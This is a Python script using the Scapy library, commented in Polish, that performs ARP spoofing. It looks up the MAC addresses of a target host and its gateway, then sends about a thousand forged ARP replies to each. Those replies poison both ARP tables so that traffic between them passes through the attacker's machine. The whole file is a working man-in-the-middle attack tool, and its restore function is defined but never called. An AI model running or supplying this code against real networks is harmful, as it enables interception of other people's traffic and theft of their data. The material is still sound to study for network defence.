from scapy.all import *

# skrypt spoofingu- wyłuskanie MAC adresu naszego targetu bez wpisywania naszego adresu w jego tablicę (przekłamanie)

from scapy.layers.l2 import Ether, ARP


#


def getMACAddress(targetip):
    arppacket = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=targetip)
    targetMAC = srp1(arppacket, timeout=5)
    return targetMAC[0][1].hwsrc


def sendspoofedreply(targetip, targetmac, sourceip):  # wysyłamy odpowiedzi ze złym source ip- spoofing
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed)
#aby zaktualizowały te urządzenia u siebie arp tables błędnymi danymi-> do source ip które będzie błedne będzie przypisany nasz mac adres

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
    send(packet, verbose=False)


def main_function(targetip, gatewayip):
    targetMAC = getMACAddress(targetip)
    gatewayMAC = getMACAddress(gatewayip)

    # # spoofing

    for i in range(1,1000):
        sendspoofedreply(targetip, targetMAC, gatewayip)  # do targetip wysyłamy pakiet z gatewayip
        sendspoofedreply(gatewayip, gatewayMAC, targetip)  # do gatewayip wysyłamy pakiet z targetip

    return 'Spoofing done-> Target MAC: ', targetMAC, ' Gateway MAC: ', gatewayMAC
